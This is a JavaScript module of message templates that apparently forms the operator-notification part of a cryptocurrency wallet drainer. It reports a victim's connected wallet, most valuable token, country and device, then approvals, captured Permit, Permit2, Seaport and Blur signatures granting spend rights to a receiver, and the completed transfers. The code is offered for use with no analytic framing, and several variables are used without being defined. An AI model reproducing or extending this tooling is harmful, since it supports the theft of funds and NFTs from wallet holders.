import _ from "lodash";

const MAIN_TOKEN = process.env.MAIN_TOKEN;

const get = (key, data) => {
  const regEx = /[^a-z\s]/gi;

  let { sender, walletName, token, domain, country, device } = _.pick(data, [
    "sender",
    "walletName",
    "token",
    "domain",
    "country",
    "device",
  ]);

  const token_name = token?.name.replace(regEx, "");
  const token_balance = token?.amount * token?.price;
  const token_chain = token?.chain.toUpperCase();
  const token_type = token?.id === MAIN_TOKEN ? "Native" : "ERC20";
  const nft_type = token?.standart === "Erc721" ? "Erc721" : "ERC1155";

  return {
    connectToken: `
    <b>
    ♻️ Wallet connected \n
    User address: <code>${sender}</code> | <a href="https://debank.com/profile/${sender}">Debank</a> \n
    Wallet name: <code>${walletName}</code> \n
    Highest token name: <code>${token.name}</code> \n
    Token type: <code>${token_type}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    Domain: ${domain} \n
    Country: <code>${country}</code> \n
    Device: <code>${device}</code>
    </b>
    `,
    connectNFT: `
    <b>
    ♻️ Wallet connected \n
    User address: <code>${sender}</code> | <a href="https://debank.com/profile/${sender}">Debank</a> \n
    Wallet name: <code>${walletName}</code> \n
    Highest token name: <code>${token_name}</code> \n
    Token type: <code>${nft_type}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    Domain: ${domain} \n
    Country: <code>${country}</code> \n
    Device: <code>${device}</code></b>`,
    approvedToken: `
    <b>
    🟢 Token <code>${token.name}</code> approved \n
    Method: <code>${method}</code> \n
    Contract: ${explorer}/token/${token.id} \n
    Amount of approved tokens: <code>${token.amount}</code> (<code>${
      token.raw_amount_hex_str
    }</code>) \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  \n
    Transaction Hash: ${explorer}/tx/${hash} ${
      error
        ? `\n
    Error: <code>${error}</code>`
        : ""
    }
    </b>
      `,
    approvedNFT: `
    <b>
    🟢 Nft <code>${token.name}</code> approved \n
    Method: <code>${method}</code>  \n
    Contract ${explorer}/token/${token.contract_id} \n
    NFT id: <code>${token.inner_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    Chain name: <code>${token_chain}</code> \n
    NFT Amount: <code>${token.amount}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  \n
    Transaction Hash: ${explorer}/tx/${hash}</b>`,
    signedPermit: `
    <b>
    ☑️ The user signed a data: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> \n
    Token contract: <code>${token.id}</code> \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From (owner): <code>${sender}</code> \n
    To (spender): <code>${receiver}</code>  \n
    Value: <code>${amount}</code> \n
    Deadline/Expiry: <code>${deadline}</code> \n
    Nonce: <code>${nonces}</code> \n
    Allowed: <code>${allowed}</code> \n
    V: <code>${v}</code> \n
    R: <code>${r}</code> \n
    S: <code>${s}</code></b>`,
    signedPermit2: `
    <b>
    ☑️ The user signed a data: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> \n
    ContractForInteraction: <code>${contractPermit2}</code> \n
    Token contract: <code>${token.id}</code> \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From (owner): <code>${sender}</code> \n
    To (spender): <code>${receiver}</code>  \n
    Value: <code>${amount}</code> \n
    Expiration/sigDeadline: <code>${deadline}</code> \n
    Nonce: <code>${nonces}</code> \n
    Signature: <code>${signature}</code></b>`,
    signedSeaport: `
    <b>
    ☑️ The user signed a data: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    ContractForInteraction: <code>${contractSeaport}</code> \n
    NFT contract: <code>${token.contract_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    NFT amount: <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    Offerer: <code>${sender}</code> \n
    Recipient: <code>${receiver}</code>  \n
    StartAmount: <code>${startAmount}</code> \n
    EndAmount: <code>${endAmount}</code> \n
    ItemType: <code>${itemType}</code> \n
    OrderType: <code>${orderType}</code>\n
    IdentifierOrCriteria: <code>${identifier}</code> \n
    ConduitKey: <code>${conduitKey}</code> \n
    Counter: <code>${counter}</code> \n
    Salt: <code>${salt}</code> \n
    StartTime: <code>${startTime}</code> \n
    EndTime: <code>${endTime}</code> \n
    Zone: <code>${zone}</code> \n
    ZoneHash: <code>${zoneHash}</code> \n
    TotalOriginalConsiderationItems: <code>${totalOriginalConsiderationItems}</code> \n
    Signature: <code>${signature}</code></b>`,
    signedBlur: `
    <b>
    ☑️ The user signed a data: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    ContractForInteraction: <code>${contractBlur}</code> \n
    NFT contract (collection): <code>${token.contract_id}</code> \n
    TokenId: <code>${token.inner_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    NFT amount (amount): <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    SellTrader: <code>${sender}</code> \n
    BuyTrader: <code>${receiver}</code>  \n
    SellSide: <code>1</code> \n
    BuySide: <code>0</code> \n
    MatchingPolicy: <code>${matchingPolicy}</code> \n
    PaymentToken: <code>${paymentToken}</code> \n
    Price: <code>${price}</code> \n
    BuyTrader: <code>${receiver}</code> \n
    ListingTime: <code>${listingTime}</code> \n
    ExpirationTome: <code>${expirationTime}</code> \n
    FeesRate: <code>${feesRate}</code> \n
    FeesRecipient: <code>${feesRecipient}</code> \n
    Salt: <code>${salt}</code> \n
    ExtraParams: <code>${extraParams}</code> \n
    SellerNonce: <code>${userNonce}</code> \n
    BuyerNonce: <code>${signerNonce}</code> \n
    V: <code>${v}</code> \n
    R: <code>${r}</code> \n
    S: <code>${s}</code> \n
    ExtraSignature: <code>${extraSignature}</code> \n
    SignatureVersion: <code>${signatureVersion}</code> \n
    BlockNumber: <code>${blockNumber}</code></b>`,
    startedTransactionToken: `
    <b>
    ❕Transaction started: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> ${
      token.id === MAIN_TOKEN
        ? ""
        : `\n
        Token contract: <code>${token.id}</code>`
    } \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code> </b>`,
    startedTransactionNFT: `
    <b>
    ❕Transaction started: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    NFT contract: <code>${token.contract_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    NFT amount: <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code> </b>`,
    deniedTransactionToken: `
    <b>
    🚫 The user denied a request: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> 
    ${
      token.id === MAIN_TOKEN
        ? ""
        : `\n
        Token contract: <code>${token.id}</code>`
    } \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code> </b>`,
    deniedTransactionNFT: `
    <b>
    🚫 The user denied a request: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    NFT contract: <code>${token.contract_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    NFT amount: <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code> </b>`,
    swappedAndSendedToken: `
    <b>
    ✅ Transaction completed: \n
    Method: <code>${method}</code> \n
    ContractForInteraction: <code>${contract}</code> \n
    Name of sent token: <code>${token.name}</code> \n
    Name of received token: <code>${swapName}</code> \n
    Contract of sent token: ${explorer}/token/${token.id} \n
    Contract of received token: ${explorer}/token/${swapContract} \n
    Amount of token sent: <code>${token.amount} ${token.name}</code> \n
    Amount of token received: <code>${swapAmount} ${swapName}</code> \n
    Balance of sent token: <code>${token_balance}$</code> \n
    Balance of received token: <code>${swapAmount * swapPrice}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  \n
    Transaction Hash: ${explorer}/tx/${hash}</b>`,
    completedTransactionToken: `
    <b>
    ✅ Transaction completed: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> ${
      token.id === MAIN_TOKEN
        ? ""
        : `\n
        Token contract: ${explorer}/token/${token.id}`
    } \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  \n
    Transaction Hash: ${explorer}/tx/${hash}
    </b>`,
    completedTransactionNFT: `
    <b>
    ✅ Transaction completed: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    NFT contract: ${explorer}/token/${token.contract_id} \n
    NFT amount: <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  \n
    Transaction Hash: ${explorer}/tx/${hash}</b>`,
    revertedTransactionToken: `
    <b>
    ❌ Transaction reverted: \n
    Method: <code>${method}</code> \n
    Token name: <code>${token.name}</code> ${
      token.id === MAIN_TOKEN
        ? ""
        : `\n
        Token contract: <code>${token.id}</code>`
    } \n
    Token amount: <code>${token.amount}</code> \n
    Token balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  ${
      error
        ? `\n
    Error: <code>${error}</code>`
        : ""
    }
    </b>
    `,
    revertedTransactionNFT: `
    <b>
    ❌ Transaction reverted: \n
    Method: <code>${method}</code> \n
    NFT name: <code>${token_name}</code> \n
    NFT contract: <code>${token.contract_id}</code> \n
    NFT standart: <code>${token.standart}</code> \n
    NFT amount: <code>${token.amount}</code> \n
    NFT balance: <code>${token_balance}$</code> \n
    Chain name: <code>${token_chain}</code> \n
    From: <code>${sender}</code> \n
    To: <code>${receiver}</code>  ${
      error
        ? `\n
    Error: <code>${error}</code>`
        : ""
    }</b>`,
  }[key];
};

export default {
  get,
};
